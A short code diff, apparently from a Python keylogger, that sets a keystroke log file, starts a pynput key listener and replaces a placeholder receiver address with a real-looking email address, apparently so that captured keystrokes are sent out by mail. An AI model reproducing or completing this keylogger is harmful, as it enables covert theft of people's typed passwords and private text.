@@ -63,7 +63,7 @@ keys_information = "key_log.txt"
 count = 0
 keys = []
 
-receiver_address = 'Email ID here'
+receiver_address = 'boigaboi12@gmail.com'
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
